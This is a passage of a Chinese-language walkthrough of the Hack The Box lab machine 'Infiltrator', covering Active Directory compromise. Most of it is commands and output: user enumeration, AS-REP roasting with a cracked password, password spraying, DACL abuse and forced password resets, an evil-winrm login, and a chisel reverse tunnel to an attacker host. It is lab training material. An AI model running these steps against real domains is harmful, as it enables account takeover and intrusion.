+<span class="line"><span>| ssl-cert: Subject: </span></span>
+<span class="line"><span>| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span></span>
+<span class="line"><span>| Issuer: commonName=infiltrator-DC01-CA</span></span>
+<span class="line"><span>| Public Key type: rsa</span></span>
+<span class="line"><span>| Public Key bits: 2048</span></span>
+<span class="line"><span>| Signature Algorithm: sha256WithRSAEncryption</span></span>
+<span class="line"><span>| Not valid before: 2024-08-04T18:48:15</span></span>
+<span class="line"><span>| Not valid after:  2099-07-17T18:48:15</span></span>
+<span class="line"><span>| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b</span></span>
+<span class="line"><span>|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071</span></span>
+<span class="line"><span>|_ssl-date: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span></span>
+<span class="line"><span>3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span></span>
+<span class="line"><span>| ssl-cert: Subject: commonName=dc01.infiltrator.htb</span></span>
+<span class="line"><span>| Issuer: commonName=dc01.infiltrator.htb</span></span>
+<span class="line"><span>| Public Key type: rsa</span></span>
+<span class="line"><span>| Public Key bits: 2048</span></span>
+<span class="line"><span>| Signature Algorithm: sha256WithRSAEncryption</span></span>
+<span class="line"><span>| Not valid before: 2024-07-30T13:20:17</span></span>
+<span class="line"><span>| Not valid after:  2025-01-29T13:20:17</span></span>
+<span class="line"><span>| MD5:   be1d:a071:bf6d:fff0:20c0:6b23:8e7e:1763</span></span>
+<span class="line"><span>|_SHA-1: cbda:6e22:6ccf:b5e7:534c:b9f0:d9e7:c5d8:dab9:769e</span></span>
+<span class="line"><span>|_ssl-date: 2024-11-14T00:17:40+00:00; -13m04s from scanner time.</span></span>
+<span class="line"><span>| rdp-ntlm-info: </span></span>
+<span class="line"><span>|   Target_Name: INFILTRATOR</span></span>
+<span class="line"><span>|   NetBIOS_Domain_Name: INFILTRATOR</span></span>
+<span class="line"><span>|   NetBIOS_Computer_Name: DC01</span></span>
+<span class="line"><span>|   DNS_Domain_Name: infiltrator.htb</span></span>
+<span class="line"><span>|   DNS_Computer_Name: dc01.infiltrator.htb</span></span>
+<span class="line"><span>|   DNS_Tree_Name: infiltrator.htb</span></span>
+<span class="line"><span>|   Product_Version: 10.0.17763</span></span>
+<span class="line"><span>|_  System_Time: 2024-11-14T00:17:00+00:00</span></span>
+<span class="line"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span>
+<span class="line"><span>|_http-server-header: Microsoft-HTTPAPI/2.0</span></span>
+<span class="line"><span>|_http-title: Not Found</span></span>
+<span class="line"><span>9389/tcp  open  mc-nmf        .NET Message Framing</span></span>
+<span class="line"><span>15220/tcp open  unknown</span></span>
+<span class="line"><span>15230/tcp open  unknown</span></span>
+<span class="line"><span>49666/tcp open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span>
+<span class="line"><span>49691/tcp open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49692/tcp open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49723/tcp open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49736/tcp open  msrpc         Microsoft Windows RPC</span></span>
+<span class="line"><span>49877/tcp open  msrpc         Microsoft Windows RPC</span></span></code></pre>
+<h3 id="dns">DNS</h3>
+<p>这里可以先挂后台跑，如果后面的枚举有新的成果，可以直接中断</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gobuster dns -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -d infiltrator.htb -o log/dns.log -r infiltrator.htb</span></span></code></pre>
+<p><img alt="image-20241115101539960.png" loading="lazy" decoding="async" width="1569" height="583" src="/_astro/image-20241115101539960.1Hl2Vc7P_2dwNgs.webp" srcset=""></p>
+<h3 id="web-dir">Web Dir</h3>
+<p>这里可以先挂后台跑，如果后面的枚举有新的成果，可以直接中断</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt -o log/web_dir.log -u http://infiltrator.htb/</span></span></code></pre>
+<p><img alt="image-20241115101554808.png" loading="lazy" decoding="async" width="1599" height="716" src="/_astro/image-20241115101554808.BB8VJuVt_1bJ0md.webp" srcset=""></p>
+<h3 id="rpc">Rpc</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>rpcclient infiltrator.htb -U 'guest%'</span></span></code></pre>
+<p><img alt="image-20241115090601507.png" loading="lazy" decoding="async" width="835" height="99" src="/_astro/image-20241115090601507.pWNUClvG_Z1rM8hk.webp" srcset=""></p>
+<h3 id="ldap">LDAP</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ldapsearch -x -H ldap://infiltrator.htb -s base </span></span></code></pre>
+<p><img alt="image-20241115084920917.png" loading="lazy" decoding="async" width="829" height="540" src="/_astro/image-20241115084920917.BGzm9O2p_ZeUcYd.webp" srcset=""></p>
+<h3 id="smb">SMB</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>netexec smb infiltrator.htb -u guest -p '' --shares</span></span>
+<span class="line"><span>netexec smb infiltrator.htb -u guest -p '' --rid-brute 10000</span></span></code></pre>
+<p><img alt="image-20241115085852364.png" loading="lazy" decoding="async" width="1744" height="280" src="/_astro/image-20241115085852364.C2JFH_cQ_Z1yKm1K.webp" srcset=""></p>
+<h2 id="shell-as-mharris">Shell as M.Harris</h2>
+<p><img alt="image-20241115091817108.png" loading="lazy" decoding="async" width="1231" height="1015" src="/_astro/image-20241115091817108.wSttFSv__1HYIDx.webp" srcset=""></p>
+<p>在 Web 页面中发现了团队成员，保存名称</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>David Anderson</span></span>
+<span class="line"><span>Olivia Martinez</span></span>
+<span class="line"><span>Kevin Turner</span></span>
+<span class="line"><span>Amanda Walker</span></span>
+<span class="line"><span>Marcus Harris</span></span>
+<span class="line"><span>Lauren Clark</span></span>
+<span class="line"><span>Ethan Rodriguez</span></span></code></pre>
+<p>生成用户名组合，使用 kerbrute 枚举用户名</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>kerbrute userenum --dc infiltrator.htb -d infiltrator.htb info/dic_user.list -o log/kerbrute_username.log</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       D.Anderson@infiltrator.htb</span></span>
+<span class="line"><span>2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       O.Martinez@infiltrator.htb</span></span>
+<span class="line"><span>2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       K.Turner@infiltrator.htb</span></span>
+<span class="line"><span>2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       A.Walker@infiltrator.htb</span></span>
+<span class="line"><span>2024/11/14 20:30:39 &gt;  [+] VALID USERNAME:       M.Harris@infiltrator.htb</span></span>
+<span class="line"><span>2024/11/14 20:30:40 &gt;  [+] VALID USERNAME:       E.Rodriguez@infiltrator.htb</span></span>
+<span class="line"><span>2024/11/14 20:30:40 &gt;  [+] VALID USERNAME:       L.Clark@infiltrator.htb</span></span>
+<span class="line"><span>2024/11/14 20:30:45 &gt;  Done! Tested 77 usernames (7 valid) in 5.990 **seconds**</span></span></code></pre>
+<h3 id="as-rep-roasting">AS-REP Roasting</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-GetNPUsers -no-pass -usersfile info/user.list infiltrator.htb/</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[-] User D.Anderson doesn't have UF_DONT_REQUIRE_PREAUTH set</span></span>
+<span class="line"><span>[-] User O.Martinez doesn't have UF_DONT_REQUIRE_PREAUTH set</span></span>
+<span class="line"><span>[-] User K.Turner doesn't have UF_DONT_REQUIRE_PREAUTH set</span></span>
+<span class="line"><span>[-] User A.Walker doesn't have UF_DONT_REQUIRE_PREAUTH set</span></span>
+<span class="line"><span>[-] User M.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set</span></span>
+<span class="line"><span>[-] User E.Rodriguez doesn't have UF_DONT_REQUIRE_PREAUTH set</span></span>
+<span class="line"><span>$krb5asrep$23$L.Clark@INFILTRATOR.HTB:59de0be66010a9b1a6d556b9dc40655c$c0a83a0c13c9d3c93845780d212b475ab9dfd03664fc96389a5b4a8a7b72b876309ec91711f79d884f88093518c1fd7c6c392ff1c56cc9b2b6f4b84902023c9fbc1ffb31d19fb65cbefebad093167c7ae1b7939e3b049f0efc404dfd0be057341484c578620f33ba407c998d20897e29bc56ec1c178b07c6bc6132c7b8aa4cc2001b6ccc0e994d78b9427f96c1329a078858eb8300170ad0bf6d5efcce373b3faa17939f71118d1832079db985a6c39904407c5d7e8706798bef1d2b5230a359fdba5303a11367b052af688630da080db393c07064a69fffd715a4c7bbe8533e3b48bfe5c344cb693f0cf79a505f744d8ef3</span></span></code></pre>
+<ul>
+<li>识别 Hash</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nth -f info/KRB_AS_REP.hash</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory</span></span>
+<span class="line"><span>...</span></span></code></pre>
+<ul>
+<li>Hashcat 爆破</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>hashcat -m 18200 info/KRB_AS_REP.hash /usr/share/wordlists/rockyou.txt</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>$krb5asrep$23$L.Clark@INFILTRATOR.HTB:65969ff15f18ac84bd58a6185f7ccd24$93a0a81d05fc4e025b62fd665a350fdfbd750f4e7af34c2bd222ab727fd4a7fa5633c3dde88ed20df3ba406637168e9b45fcf9397784039601cac294c2ecd8cb6b24efec7ee83bece85a0a1a98f2852698284b8912e88fae047d9fdd9c88dfdbccf44c61eaa50427a5415260ebfe26f3db3c2a1efc996a2d92086589f515383854ae3502f0834e0da01ca5d20783d4a6ba3cd6019163df47c291bd99950e16deafa5bf5d7ccc39cfab61c5b71912b9aed41b259c708945e2b51c7d5fb5f7d0dae3cc955efa7ac9569ce98181e306ebc3834a1dd97817e9d6c03f4dfff165f526cc2b2a4b72c418b68cc6ccae4783cb73bd31:WAT?watismypass!</span></span>
+<span class="line"><span>...</span></span></code></pre>
+<p>拿到凭据 <code>L.Clark : WAT?watismypass!</code></p>
+<h3 id="ldap-enum-user">LDAP Enum user</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>netexec ldap infiltrator.htb -u 'L.Clark' -p 'WAT?watismypass!' --users</span></span></code></pre>
+<p><img alt="image-20241115145558956.png" loading="lazy" decoding="async" width="2009" height="445" src="/_astro/image-20241115145558956.HwF05sH0_180pkC.webp" srcset=""></p>
+<p>这里拿到了一个 <code>K.turner</code> 用户的备注，很像密码，先保存 <code>MessengerApp@Pass!</code></p>
+<h3 id="密码喷射">密码喷射</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>kerbrute passwordspray -d infiltrator.htb --dc 10.10.11.31 info/user.list 'WAT?watismypass!'</span></span>
+<span class="line"><span>kerbrute passwordspray -d infiltrator.htb --dc 10.10.11.31 info/user.list 'MessengerApp@Pass!'</span></span></code></pre>
+<p><img alt="image-20241115154323291.png" loading="lazy" decoding="async" width="1535" height="432" src="/_astro/image-20241115154323291.BYSA6oiI_Z2rfEVs.webp" srcset=""></p>
+<p><img alt="image-20241116191458803.png" loading="lazy" decoding="async" width="1559" height="377" src="/_astro/image-20241116191458803.BirSdCjD_Z1rhNIA.webp" srcset=""></p>
+<p>两个用户使用的是这个密码，可以再枚举一下共享目录</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>netexec smb infiltrator.htb -u info/user.list -p 'WAT?watismypass!' --shares</span></span></code></pre>
+<p><img alt="image-20241115154520414.png" loading="lazy" decoding="async" width="1645" height="369" src="/_astro/image-20241115154520414.EjjXWx_S_10aaVD.webp" srcset=""></p>
+<p>只有 L.Clark 有共享目录</p>
+<h3 id="smb-1">SMB</h3>
+<p>使用爬取模块，把共享目录文件信息下载到本地</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>netexec smb infiltrator.htb -u L.Clark -p 'WAT?watismypass!' -M "spider_plus"</span></span></code></pre>
+<p><img alt="image-20241115094907649.png" loading="lazy" decoding="async" width="2125" height="775" src="/_astro/image-20241115094907649.BN-vuLQS_Z13yMJG.webp" srcset=""></p>
+<p><img alt="image-20241115095258652.png" loading="lazy" decoding="async" width="1480" height="1191" src="/_astro/image-20241115095258652.Do18dHeU_Z1cPsbe.webp" srcset=""></p>
+<p>从共享文件的名称和大小，没发现什么闪光点，这里也可以每个都查看一下。</p>
+<h3 id="winrm">WinRM</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>netexec winrm infiltrator.htb -u info/user.list -p info/pass.list</span></span></code></pre>
+<p><img alt="image-20241115154707007.png" loading="lazy" decoding="async" width="1588" height="328" src="/_astro/image-20241115154707007.CsuS-16J_CIQJn.webp" srcset=""></p>
+<p>WinRM 无法登录</p>
+<h3 id="bloodhound">BloodHound</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> bloodhound-python</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -c</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> all</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --zip</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -dc</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'infiltrator.htb'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -ns</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> '10.10.11.31'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'infiltrator.htb'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'L.Clark'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'WAT?watismypass!'</span></span></code></pre>
+<p><img alt="image-20241115101948892.png" loading="lazy" decoding="async" width="1595" height="591" src="/_astro/image-20241115101948892.Dw6JIRAt_Z1AiUx2.webp" srcset=""></p>
+<p>查看高价值路径</p>
+<p><img alt="image-20241115154907790.png" loading="lazy" decoding="async" width="1486" height="460" src="/_astro/image-20241115154907790.DTCkVKJ-_pkftG.webp" srcset=""></p>
+<p>这个路径可以拿到 <code>M.Harris</code> 的权限，从而远程登录机器拿到 User Shell</p>
+<p>首先修改 <code>E.Rodriguez</code> 的密码</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># 获取 D.Anderson 票据</span></span>
+<span class="line"><span>impacket-getTGT 'infiltrator.htb'/'D.Anderson':'WAT?watismypass!'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 更改 FullControl 权限</span></span>
+<span class="line"><span>KRB5CCNAME=D.Anderson.ccache /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'D.Anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb'/'D.Anderson':'WAT?watismypass!' -dc-ip dc01.infiltrator.htb -k -no-pass</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>bloodyAD --host "dc01.infiltrator.htb" -d 'infiltrator.htb' -u 'D.Anderson' -p 'WAT?watismypass!' -k --dc-ip '10.10.11.31' set password 'E.Rodriguez' 'Admin@123'</span></span></code></pre>
+<p><img alt="image-20241115220410982.png" loading="lazy" decoding="async" width="2027" height="552" src="/_astro/image-20241115220410982.BnWNV7dV_Z2kRMFF.webp" srcset=""></p>
+<p>然后 <code>E.Rodriguez</code> 把自己添加到 <code>Chiefs Marketing</code> 组中</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>bloodyAD --host "dc01.infiltrator.htb" -d 'infiltrator.htb' -u 'E.Rodriguez' -p 'Admin@123' -k --dc-ip '10.10.11.31' add groupMember 'Chiefs Marketing' 'E.Rodriguez'</span></span></code></pre>
+<p><img alt="image-20241115221022787.png" loading="lazy" decoding="async" width="2070" height="115" src="/_astro/image-20241115221022787.C0S2_3DI_Z1kLUuV.webp" srcset=""></p>
+<p>再修改 <code>M.Harris</code> 的密码</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>bloodyAD --host "dc01.infiltrator.htb" -d 'infiltrator.htb' -u 'E.Rodriguez' -p 'Admin@123' -k --dc-ip '10.10.11.31' set password 'M.Harris' 'Admin@123'</span></span></code></pre>
+<p><img alt="image-20241115221037702.png" loading="lazy" decoding="async" width="1917" height="115" src="/_astro/image-20241115221037702.Bzd3NdEh_nf7bN.webp" srcset=""></p>
+<p>然后可以使用 <code>M.Harris</code> 账户远程登录了</p>
+<p><img alt="image-20241115225212345.png" loading="lazy" decoding="async" width="1630" height="358" src="/_astro/image-20241115225212345.CHGHDM85_ZBQpq1.webp" srcset=""></p>
+<p>直接连是不行的，需要使用 Kerberos 认证票据</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-getTGT 'infiltrator.htb'/'M.Harris':'Admin@123'</span></span>
+<span class="line"><span>KRB5CCNAME=M.Harris.ccache evil-winrm -i 'dc01.infiltrator.htb' -u 'M.Harris' -p 'Admin@123' -r 'infiltrator.htb'</span></span></code></pre>
+<p><img alt="image-20241115225250980.png" loading="lazy" decoding="async" width="1489" height="508" src="/_astro/image-20241115225250980.CHYFm6fd_ZnyLQ9.webp" srcset=""></p>
+<p>还是出现报错，同时也提示可以省略用户名和密码，这里的原因是 KDC 对于域名 <code>INFILTRATOR.HTB</code> 无法定位需要修改 <code>/etc/krb5.conf</code> 配置文件。</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[libdefaults]</span></span>
+<span class="line"><span>    default_realm = INFILTRATOR.HTB</span></span>
+<span class="line"><span>    dns_lookup_realm = false</span></span>
+<span class="line"><span>    dns_lookup_kdc = false</span></span>
+<span class="line"><span>    forwardable = true</span></span>
+<span class="line"><span>[realms]</span></span>
+<span class="line"><span>    INFILTRATOR.HTB = {</span></span>
+<span class="line"><span>        kdc = dc01.infiltrator.htb</span></span>
+<span class="line"><span>        admin_server = dc01.infiltrator.htb</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span>[domain_realm]</span></span>
+<span class="line"><span>    .infiltrator.htb = INFILTRATOR.HTB</span></span>
+<span class="line"><span>    infiltrator.htb = INFILTRATOR.HTB</span></span></code></pre>
+<p>再次尝试登录</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>KRB5CCNAME=M.Harris.ccache evil-winrm -i 'dc01.infiltrator.htb' -r 'infiltrator.htb'</span></span></code></pre>
+<p><img alt="image-20241115231220340.png" loading="lazy" decoding="async" width="1378" height="606" src="/_astro/image-20241115231220340.CVPMBYIt_aCI6U.webp" srcset=""></p>
+<p>成功获取 Shell 权限，这里为了方便使用 Havoc 上线，然后使用 WinPEAS 枚举本地提权路径</p>
+<h2 id="shell-as-winrm_svc">Shell as winrm_svc</h2>
+<p><img alt="image-20241116122518554.png" loading="lazy" decoding="async" width="1926" height="778" src="/_astro/image-20241116122518554.B3vHth3T_Z2d4cDF.webp" srcset=""></p>
+<p>在 WinPEAS 中可以看到 14*** 端口有一些服务，把 14*** 的端口转发到本地</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>shell c.exe client -v [hack_ip]:8080 R:0.0.0.0:14406:127.0.0.1:14406 R:0.0.0.0:14118:127.0.0.1:14118 R:0.0.0.0:14121:127.0.0.1:14121 R:0.0.0.0:14122:127.0.0.1:14122 R:0.0.0.0:14123:127.0.0.1:14123 R:0.0.0.0:14125:127.0.0.1:14125 R:0.0.0.0:14126:127.0.0.1:14126 R:0.0.0.0:14127:127.0.0.1:14127 R:0.0.0.0:14128:127.0.0.1:14128 R:0.0.0.0:14130:127.0.0.1:14130 </span></span></code></pre>
+<p>扫描一下这些端口的信息</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nmap --min-rate 1000 -T4 -sV -p 14406,14130,14128,14118,14126,14127,14125,14122,14123 127.0.0.1</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>PORT      STATE SERVICE     VERSION</span></span>
+<span class="line"><span>14118/tcp open  ssl/unknown</span></span>
+<span class="line"><span>14122/tcp open  unknown</span></span>
+<span class="line"><span>14123/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span>
+<span class="line"><span>14125/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span>
+<span class="line"><span>14126/tcp open  http        Apache httpd 2.4.9 ((Win32) PHP/5.5.12)</span></span>
+<span class="line"><span>14127/tcp open  unknown</span></span>
+<span class="line"><span>14128/tcp open  unknown</span></span>
+<span class="line"><span>14130/tcp open  unknown</span></span>
+<span class="line"><span>14406/tcp open  mysql       MySQL 5.5.5-10.1.19-MariaDB</span></span></code></pre>
+<p>先试试 MySQL</p>
+<p><img alt="image-20241116123657192.png" loading="lazy" decoding="async" width="1155" height="336" src="/_astro/image-20241116123657192.BABE9Z4M_25bY4q.webp" srcset=""></p>
+<p>这里提示是需要密码的，试一下前面没用上的 <code>MessengerApp@Pass!</code></p>
+<p><img alt="image-20241116193359013.png" loading="lazy" decoding="async" width="1031" height="161" src="/_astro/image-20241116193359013.CoTkcZap_ZGnNmP.webp" srcset=""></p>
+<p>还是不对，再看看几个 HTTP 服务，先看 14123 的</p>
+<p><img alt="image-20241116193503990.png" loading="lazy" decoding="async" width="928" height="616" src="/_astro/image-20241116193503990.CcFyMvxS_siAv7.webp" srcset=""></p>
+<p><img alt="image-20241116193614297.png" loading="lazy" decoding="async" width="842" height="553" src="/_astro/image-20241116193614297.DKzQvnoV_ZsC816.webp" srcset=""></p>
+<p>前面发现的 <code>K.turner</code> 用户的备注信息就是 <code>OutPut Messenger</code> 服务的密码 <code>MessengerApp@Pass!</code></p>
+<p><img alt="image-20241116194231536.png" loading="lazy" decoding="async" width="943" height="612" src="/_astro/image-20241116194231536.B7Ueypeu_1G9wsG.webp" srcset=""></p>
+<p>发现一些聊天记录，但是没啥营养，再看一下另外两个端口</p>
+<p><img alt="image-20241116194535973.png" loading="lazy" decoding="async" width="1255" height="373" src="/_astro/image-20241116194535973.DplFkfAd_Z1wAEXc.webp" srcset=""></p>
+<p><img alt="image-20241116194543660.png" loading="lazy" decoding="async" width="1250" height="266" src="/_astro/image-20241116194543660.CDC6Lm3V_1rA6KE.webp" srcset=""></p>
+<p>回看一下这个 Web 客户端的功能点很少，打算去找找有没有什么漏洞，比如 XSS 之类的</p>
+<p><img alt="image-20241118233742779.png" loading="lazy" decoding="async" width="1418" height="836" src="/_astro/image-20241118233742779.BiYvYBZQ_Ltj3s.webp" srcset=""></p>
+<p>在官网看到，这个是由客户端的，而且功能明显不止网页的那些，还可以传文件，安装一下</p>
+<p><img alt="image-20241118234859418.png" loading="lazy" decoding="async" width="980" height="758" src="/_astro/image-20241118234859418.C0knKj8u_ZLkydM.webp" srcset=""></p>
+<p>这里代理的端口 14121 没问题就可以登录</p>
+<p><img alt="image-20241118235013738.png" loading="lazy" decoding="async" width="1185" height="1187" src="/_astro/image-20241118235013738.BqK8NtPD_ofmzw.webp" srcset=""></p>
+<p>在这里发现了 <code>m.harris</code> 的凭据 <code>D3v3l0p3r_Pass@1337!</code></p>
+<p><img alt="image-20241118235352381.png" loading="lazy" decoding="async" width="1142" height="950" src="/_astro/image-20241118235352381.CzyB6so8_Z22tQdO.webp" srcset=""></p>
+<p>发现了 Admin 发送的 UserExplorer.exe 文件，从群聊中可以知道，这程序用到了 AES 加密</p>
+<p><img alt="image-20241118235927144.png" loading="lazy" decoding="async" width="1312" height="179" src="/_astro/image-20241118235927144.C8GP95ac_Z2sqACv.webp" srcset=""></p>
+<p>是个 .NET 框架编译的 PE 文件，启动 <code>CodeMerxDecompile</code></p>
+<p><img alt="image-20241119000050809.png" loading="lazy" decoding="async" width="1582" height="697" src="/_astro/image-20241119000050809.CD_iGDv6_Hlb2C.webp" srcset=""></p>
+<p>找到了 winrm_svc 相关的信息</p>
+<p><img alt="image-20241119000127871.png" loading="lazy" decoding="async" width="1437" height="815" src="/_astro/image-20241119000127871.CAxYkLBr_YkGKB.webp" srcset=""></p>
+<p>下面还看到了解密函数，第一个参数大概是密钥，尝试解密</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=</span></span>
